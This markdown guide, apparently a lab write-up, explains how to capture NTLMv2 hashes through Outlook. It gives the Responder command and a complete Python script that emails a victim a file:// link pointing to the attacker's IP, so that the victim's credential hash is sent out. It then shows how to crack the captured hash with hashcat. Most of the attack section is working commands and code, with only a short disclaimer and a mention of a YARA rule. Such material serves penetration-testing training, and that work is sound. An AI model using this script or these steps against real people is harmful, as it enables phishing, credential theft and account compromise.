# Capturing NTLMv2 Hash via Outlook SMB Request

This guide shows how to use Outlook and SMB protocol to capture an NTLMv2 hash from a victim's machine by sending a specially crafted email and using the Responder tool to intercept the hash.

---

## ğŸ“š Table of Contents

- [ğŸ› ï¸ Capturing NTLMv2 Hash via Outlook SMB Request](#ï¸-capturing-ntlmv2-hash-via-outlook-smb-request)
- [ğŸ”§ 1. What You Need](#ï¸-1-what-you-need)
- [ğŸ’¡ 2. Explanation of Basic Concepts](#ï¸-2-explanation-of-basic-concepts)
   - [ğŸ“¬ What is an SMTP Server?](#ï¸-what-is-an-smtp-server)
- [ğŸŒ 3. How to Find Your Attacker Machineâ€™s IP Address](#ï¸-3-how-to-find-your-attacker-machines-ip-address)
- [ğŸ’£ 4. How Does It Work?](#ï¸-4-how-does-it-work)
- [âœ… 5. Step-by-step from Zero (Example with a Fake SMTP Server)](#ï¸-5-step-by-step-from-zero-example-with-a-fake-smtp-server)
  - [ğŸ” Where to See the Hash?](#ï¸-where-to-see-the-hash)
  - [ğŸ› ï¸ (Optional) Crack the Hash](#ï¸-optional-crack-the-hash)
  - [âš ï¸ Important Notes](#ï¸-important-notes)
  - [ğŸ’¡ Hint for Penetration Testers](#ï¸-hint-for-penetration-testers)

---

## ğŸ”§ 1. What You Need

To perform this technique, you need:

| Component           | Description                                                                                  |
|---------------------|----------------------------------------------------------------------------------------------|
| **Attacker Machine** | Your Kali Linux (or THM AttackBox) where the attack is executed.                             |
| **Victim Machine**   | Windows PC running Outlook (can use VM for testing).                                        |
| **Local IP**         | Attacker machineâ€™s IP address on the network (e.g., `192.168.1.10`).                        |
| **SMTP Server**      | Server that sends the email â€“ you must know the address, port, and login credentials.       |
| **Responder Tool**   | Tool that listens for SMB requests and captures NTLM hashes.                                |

---

# ğŸ’¡ 2. Explanation of Basic Concepts

### ğŸ“¬ What is an SMTP Server?

SMTP = Simple Mail Transfer Protocol  
It is the server responsible for sending emails from one account to another.

When sending emails via a Python script, you must specify the SMTP server used â€“  
for example, Gmail uses `smtp.gmail.com`, Outlook uses `smtp.office365.com`, etc.

In labs like TryHackMe, you often use a fake SMTP server that is already set up (e.g., `10.10.143.109`).

---

# ğŸŒ 3. How to Find Your Attacker Machineâ€™s IP Address

On Kali Linux (or any Linux), run this command in the terminal:

```bash
ip a
```
Look for the line containing inet 192.168.x.x or 10.10.x.x â€“ that is your local IP address.

# ğŸ’£ 4. How Does It Work?
ğŸ¯ Goal:
Make Outlook automatically send the NTLMv2 hash to your machine.

ğŸ§  Mechanism:
Outlook opens file:// links (network file links).

When you click on this link in the email:

<a href="file://192.168.1.10/test!exploit">Click me</a>
Outlook:

tries to load the file

sends an SMB authentication request including the NTLM hash

On your side, Responder listens and captures the hash.

# âœ… 5. Step-by-step from Zero (Example with a Fake SMTP Server)
ğŸ–¥ï¸ On Kali Linux (Attacker)
Find your IP
```
ip a
```
Note it down, e.g., 192.168.1.10.

Start Responder
```
sudo responder -I eth0
```
(replace eth0 with your network interface name)

Create the exploit.py script:
```
nano exploit.py
```
Paste the following Python code:

# â¬‡ï¸â¬‡ï¸ Don't forget to change what is needed. â¬‡ï¸â¬‡ï¸

```bash
 import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@example.com'
receiver_email = 'victim@example.com'
password = 'attacker'  # only if SMTP requires authenticationâ¬…ï¸â¬…ï¸

html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://192.168.1.10/test!exploit">Click me</a></p>â¬…ï¸â¬…ï¸â¬…
</html>"""

message = MIMEMultipart()
message['Subject'] = "Check this out!"
message["From"] = formataddr(('Hacker', sender_email))
message["To"] = receiver_email

msgHtml = MIMEText(html_content, 'html')
message.attach(msgHtml)

server = smtplib.SMTP('10.10.143.109', 25)  # â† change this if you need another server â¬…ï¸â¬…ï¸
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\nEmail delivered")
except Exception as error:
    print(error)
finally:
    server.quit()

```

#### Run the script:
```
python3 exploit.py
```
If successful, you will see:


ğŸ“§ Email delivered

ğŸ’» On the Windows Machine (Victim)
 Open Outlook
 Open the received email

 Click the #"Click me"# link

Outlook will try to open the SMB link â†’ sending the NTLM hash.

ğŸ” Where to See the Hash?
Responder terminal will automatically display a line like this:

## [SMB] NTLMv2-Hash captured from VICTIM
ğŸ› ï¸ (Optional) Crack the Hash
Copy the hash into a file called hash.txt and then use Hashcat:
 ```
hashcat -m 5600 hash.txt rockyou.txt --force
```


## âš ï¸ Important Notes
> This guide is for educational purposes only and for testing in your own controlled environments.
> Do NOT use these techniques on networks or machines without explicit permission!



## HINT for PENETRATION TESTERS: A Yara rule has been created to detect emails containing the file:\\ element in the Moniker Link. 
